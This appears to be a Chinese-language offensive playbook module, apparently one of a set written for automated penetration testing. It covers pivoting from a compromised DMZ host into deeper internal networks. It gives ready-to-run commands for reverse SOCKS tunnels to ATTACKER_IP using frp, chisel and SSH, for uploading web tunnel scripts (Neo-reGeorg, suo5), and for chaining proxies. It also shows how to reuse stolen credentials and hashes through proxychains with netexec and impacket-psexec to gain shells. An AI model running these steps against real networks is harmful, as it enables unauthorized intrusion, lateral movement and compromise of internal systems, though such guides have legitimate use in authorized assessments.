# 隧道与多层网络

> 适用：已拿下 DMZ/边界主机，目标在另一网段或防火墙后、攻击机不能直连时，用最小部署把可达面延伸到目标网段。

## 认什么

- 立足点有第二张网卡或额外路由：`ip route` 出现 10./172.16./192.168. 段；`ipconfig /all` 多网卡；`arp -a` 有大量内网条目；`/etc/hosts`、`~/.ssh/known_hosts` 里有内网主机。
- 真实判据是**从立足点能到、从攻击机不能到**：立足点 `curl`/`nc` 通目标段端口，攻击机直连超时 → 它是跳板。只看到一堆内网 IP 不算。
- 出网面决定工具选型：可直连外网 / 只能 80、443 出 / 完全不出网；有 SSH 凭据优先 SSH（零部署）。
- 能不能落文件：有 Web 写权限或 shell 上传口 → 可以放 client；只有命令执行、无写权限 → 走内存或复用系统 SSH。

## 打哪（命令）

### 0. 先测绘，别急着建隧道

```bash
ip addr && ip route && arp -a && cat /etc/hosts        # Linux
ipconfig /all && route print && arp -a                 # Windows
ss -tlnp                                               # 本机监听，常暴露内网代理/数据库
```

多网卡（eth0 外网、eth1 10.x）＝天然跳板；只有内网 IP ＝必须做反向隧道。首轮存活可用轻量 ping 循环，再上 `fscan -h 10.0.0.0/24 -nopoc` 摸端口，别一上来开大范围 nmap：

```bash
for i in $(seq 1 254); do ping -c 1 -W 1 10.0.0.$i &>/dev/null && echo "10.0.0.$i alive"; done
```

### 1. 选型决策

```
能出网？
├─ 能 → 有 SSH 凭据：ssh -D 1080（零部署）
│       要长期稳定：frp（断线重连）
│       要快速部署：chisel（单二进制）
├─ 只有 HTTP(S) 出网 → Neo-reGeorg / suo5（Web 隧道）
└─ 完全不出网 → SSH 反向隧道，或在跳板上中转/级联
```

| 场景 | 工具 | 要点 |
|---|---|---|
| 有 SSH 凭据 | SSH 隧道 | 无需落地文件，最省事 |
| 出网＋长期 | frp | 断线重连，配置多但稳 |
| 出网＋临时 | chisel | 单文件，一条命令起 socks |
| 仅 HTTP 出网 | Neo-reGeorg / suo5 | 走 Web 端口穿防火墙 |
| 高性能/打全网段 | ligolo-ng | TUN 接口，接近原生；能跑 ICMP/UDP |

### 2. 落地命令

frp（攻击机 `frps.ini`：`[common] bind_port = 7000`）：

```bash
frps -c frps.ini
# 目标 frpc.ini:
# [common]
# server_addr = ATTACKER_IP
# server_port = 7000
# [socks5]
# type = tcp
# remote_port = 1080
# plugin = socks5
frpc -c frpc.ini          # 攻击机 127.0.0.1:1080 即内网 SOCKS5
```

chisel：

```bash
chisel server --reverse --port 8080          # 攻击机
chisel client ATTACKER_IP:8080 R:1080:socks  # 目标
```

SSH 四种形态：

```bash
ssh -D 1080 -N -f user@JUMPBOX                          # 动态 SOCKS
ssh -L 3389:INTERNAL_HOST:3389 -N -f user@JUMPBOX       # 本地端口转发
ssh -R 8888:INTERNAL_HOST:80 -N -f user@JUMPBOX         # 远程端口转发
ssh -R 1080 attacker@ATTACKER_IP                        # 反向隧道
```

HTTP 隧道（Web 端口是唯一出网面时）：

```bash
python neoreg.py generate -k PASSWORD     # 生成 tunnel.php/jsp/aspx
# 上传到目标 Web 目录后：
python neoreg.py -k PASSWORD -u http://target/tunnel.php -p 1080
# 或 suo5（Go 单文件，更快更稳）：
./suo5 -t http://TARGET/suo5.jsp -l 127.0.0.1:1080
```

### 3. 多层链路（攻击机 → DMZ → 内网A → 内网B）

```bash
# 方式一：链式 SSH（有凭据时最干净）
ssh -J user1@DMZ,user2@10.0.0.5 user3@172.16.0.10

# 方式二：链式 SOCKS
ssh -D 1080 user@DMZ
proxychains ssh -D 1081 user@10.0.0.5      # 1081 才是最深出口
# proxychains.conf 末尾：socks5 127.0.0.1 1081

# 方式三：frp 级联，每跳部署 frpc 层层转发到攻击机 frps
```

### 4. proxychains 用法与边界

```bash
# /etc/proxychains4.conf 末尾：socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p 22,80,445,3389,1433 10.0.0.0/24
proxychains netexec smb 10.0.0.0/24 -u USER -p PASS
proxychains curl http://10.0.0.100/
proxychains impacket-psexec DOMAIN/admin:pass@10.0.0.1
```

proxychains **只代理 TCP**：ICMP（ping）不通、UDP 扫描（`-sU`）失败，nmap 必须 `-sT -Pn`。建好先 `proxychains curl` 打一个已知服务验通，再扫。

### 5. 稳定性与记录

- 隧道进程容易断：长期用 frp 的断线重连，或 `autossh` 保活；断了先看 client 进程和回连端口，不要重扫。
- 每跳单独记一行：跳板 IP、入口端口、隧道类型、代理端口、凭据来源。下一轮照抄就能复原，不必从头挖。
- 深处目标段优先走 TUN 类工具（ligolo-ng），能正常发 ICMP/UDP，比 SOCKS 更适合全网段扫描与横向。
- 明文 socks/HTTP 隧道会暴露内网流量，评估中只用它搬运必要请求，不拿它传真实业务数据。

## 什么算成

- 经代理能取回目标网段服务的**真实业务内容**（登录页、接口 JSON、SMB 共享列表、数据库 banner），而不是 curl 报错或公网首页。
- 复用已拿凭据经隧道登录目标成功一次：`netexec smb ... -H` 回 Pwn3d/Admin、`impacket-psexec` 起 shell、RDP 3389 出登录界面。
- 链路可重建：每跳的工具、端口、命令、凭据都记录在案，换一台攻击机照抄能复原。
- 稳定性达标：连续多次请求不断线（否则先换 frp/autossh，不算打通）。

## 假点

- 隧道进程起来了，但没有回程/防火墙只放了单向 SYN → `proxychains curl` 超时。
- 代理绑在跳板 `127.0.0.1`，从攻击机连不上；或 frpc 没配 `plugin = socks5`，1080 不是 socks。
- 用 ping 判定网段不通（proxychains 不走 ICMP）；nmap `-sS`/`-sU` 失败被当成目标无端口。
- 代理只到跳板本机端口，就宣称"打进内网"；或者扫描流量把隧道打满、拖垮业务，当成功。
- curl 到公网首页/ICP 号当"通内网"；只做单跳没验证最深网段。

## 与其他包联动

- 隧道通了之后：`internal-05`（PTH/票据横向）、`internal-07`（立足点提权）、`internal-09`（Exchange/SCCM/OA/数据库）。
- 工具怎么落到跳板：`internal-10`；HTTP 出网下走 Web 隧道的前提是 `internal-09` 里拿到 webshell。
- 云上内网（VPC/元数据/容器网段）：`cloud-infra`；写盘/改配置前读 `../../../../rules/20-min-harm.md`，扫描范围与留证据按 `../../../../rules/60-scope-iteration.md`、`../../../../rules/40-evidence-report.md`。
